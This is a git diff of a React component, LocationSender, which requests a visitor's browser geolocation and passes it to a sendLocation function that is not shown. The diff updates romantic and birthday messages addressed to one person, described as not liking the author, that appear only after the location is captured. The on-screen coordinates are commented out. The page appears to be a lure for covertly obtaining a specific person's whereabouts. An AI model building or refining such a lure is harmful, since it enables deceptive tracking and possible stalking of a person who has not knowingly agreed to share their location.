@@ -1,4 +1,5 @@
 import React, { useState } from "react";
+import LovePoem from "./components/LovePoem";
 
 const LocationSender = () => {
   const [status, setStatus] = useState("");
@@ -36,30 +37,34 @@ const LocationSender = () => {
     setStatus("📍 Getting Started");
 
     navigator.geolocation.getCurrentPosition(
-        (position) => {
-            const { latitude, longitude } = position.coords;
-            setCoords({ latitude, longitude });
-            sendLocation(latitude, longitude);
-        },
-        (error) => {
-            console.error(error);
+      (position) => {
+        const { latitude, longitude } = position.coords;
+        setCoords({ latitude, longitude });
+        sendLocation(latitude, longitude);
+      },
+      (error) => {
+        console.error(error);
 
-            if (error.code === error.PERMISSION_DENIED) {
-            setStatus("⚠️ You denied location. Please enable it in browser settings.");
-            } else if (error.code === error.POSITION_UNAVAILABLE) {
-            setStatus("❌ Location unavailable. Turn on GPS or check network.");
-            } else if (error.code === error.TIMEOUT) {
-            setStatus("⌛ Location request timed out. Try again.");
-            } else {
-            setStatus("❌ Unknown error getting location.");
-            }
+        if (error.code === error.PERMISSION_DENIED) {
+          setStatus(
+            "⚠️ You denied location. Please enable it in browser settings.",
+          );
+        } else if (error.code === error.POSITION_UNAVAILABLE) {
+          setStatus("❌ Location unavailable. Turn on GPS or check network.");
+        } else if (error.code === error.TIMEOUT) {
+          setStatus("⌛ Location request timed out. Try again.");
+        } else {
+          setStatus("❌ Unknown error getting location.");
         }
+      },
     );
   };
 
   return (
-    <div style={{ textAlign: "center", marginTop: "3rem" }}>
-      <h1>I don't know why i still miss you suddenly you come into my mind and my mind goes blank remembering the time which i spended with you and a lot of things. Don't know you miss me or not but i still miss you sometimes i saw you in my dreams.</h1>
+    <div style={{ textAlign: "center", marginTop: "3rem" }} className="">
+      <h1>
+        <LovePoem />
+      </h1>
       <button
         onClick={handleSendLocation}
         style={{
@@ -83,24 +88,27 @@ const LocationSender = () => {
             {/* <strong>Latitude:</strong> {coords.latitude} */}
             {coords.latitude && (
               <div>
-  <h3 className="luv-title">I know you don't like me.</h3>
+                <h3 className="luv-title">
+                  A little early... but my heart couldn't wait.
+                </h3>
 
-<p className="luv-sub">
-  Whenever i think about you i don't know but you resemble to me like a little baby.
-  I want you touch your cheeks and hair like a baby. There are alot of thing i miss when i think about you.
-</p>
+                <p className="luv-sub">
+                  Your birthday hasn't come yet, but I already find myself
+                  smiling — thinking about the day the world got a little more
+                  beautiful because you were born in it. You may not know how
+                  much you mean to me, but I hope someday you feel even a
+                  fraction of the warmth you make me feel just by existing. The
+                  day i first saw you was day same day i fell in love with you.
+                </p>
 
-
-<div className="luv-small">
- I wish i could have marry you and can make you my wife.
-</div>
-</div>
-
-)}
+                <div className="luv-small">
+                  Happy birthday in advance, my favourite person I'm too afraid
+                  to tell i never have imagined life without you. 🎂
+                </div>
+              </div>
+            )}
           </p>
-          <p>
-            {/* <strong>Longitude:</strong> {coords.longitude} */}
-          </p>
+          <p>{/* <strong>Longitude:</strong> {coords.longitude} */}</p>
           {/* <a
             href={`https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`}
             target="_blank"
